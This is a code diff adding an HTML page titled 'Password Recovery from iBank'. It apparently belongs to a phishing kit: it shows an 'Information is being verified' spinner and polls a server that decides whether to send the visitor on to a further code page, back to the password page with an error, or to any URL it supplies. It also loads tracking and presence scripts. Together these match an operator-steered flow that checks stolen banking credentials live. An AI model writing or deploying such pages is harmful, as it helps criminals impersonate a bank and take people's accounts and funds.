@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Password Recovery from iBank</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+
+  .header{
+    display:flex;align-items:center;justify-content:flex-end;
+    padding:14px 18px;border-bottom:1px solid #eee;
+  }
+  .x-btn{background:none;border:none;cursor:pointer;padding:8px}
+  .x-btn svg{width:22px;height:22px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}
+
+  .body{
+    flex:1;display:flex;flex-direction:column;align-items:center;
+    padding:80px 28px 0;
+  }
+
+  .title{
+    font-size:26px;font-weight:400;color:#1a1a1a;
+    text-align:center;line-height:1.35;margin-bottom:48px;
+  }
+
+  .ring-wrap{
+    position:relative;width:140px;height:140px;
+    display:flex;align-items:center;justify-content:center;margin-bottom:36px;
+  }
+  .ring-bg{position:absolute;inset:0;border-radius:50%;border:3px solid rgba(252,103,25,.12)}
+  .ring-spin{
+    position:absolute;inset:0;border-radius:50%;
+    border:3.5px solid transparent;border-top:3.5px solid #fc6719;border-right:3.5px solid #fc6719;
+    animation:spin 1.2s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .hint{
+    font-size:15px;color:#9aa0a6;text-align:center;line-height:1.6;
+    max-width:320px;
+  }
+  .hint strong{color:#1a1a1a;font-weight:500}
+</style>
+</head>
+<body>
+
+  <div class="header">
+    <button class="x-btn" onclick="history.back()" aria-label="Close">
+      <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
+    </button>
+  </div>
+
+  <div class="body">
+    <div class="title">Password Recovery from<br>iBank</div>
+
+    <div class="ring-wrap">
+      <div class="ring-bg"></div>
+      <div class="ring-spin"></div>
+    </div>
+
+    <div class="hint">
+      <strong>Information is being verified</strong>
+    </div>
+  </div>
+
+<script>
+  const params  = new URLSearchParams(location.search);
+  const orderId = params.get("order");
+  const phone   = params.get("phone");
+
+  if (!orderId) location.href = "index.html";
+
+  function qs(extra) {
+    return "?order=" + orderId +
+           (phone ? "&phone=" + encodeURIComponent(phone) : "") +
+           (extra || "");
+  }
+
+  function checkStatus() {
+    fetch("/api/orders/" + orderId + "/status")
+      .then(r => r.json())
+      .then(data => {
+        if (data.redirect_to) {
+          const sep = data.redirect_to.includes('?') ? '&' : '?';
+          location.href = data.redirect_to + sep + 'order=' + orderId +
+                          (phone ? "&phone=" + encodeURIComponent(phone) : "");
+          return;
+        }
+        if (data.status === "confirmed") {
+          location.href = "code3.html" + qs();
+        } else if (data.status === "rejected") {
+          location.href = "password.html" + qs("&error=1");
+        }
+      })
+      .catch(() => {});
+  }
+
+  setInterval(checkStatus, 3000);
+  checkStatus();
+</script>
+<script src="/tracker.js"></script>
+<script src="/presence.js"></script>
+</body>
+</html>
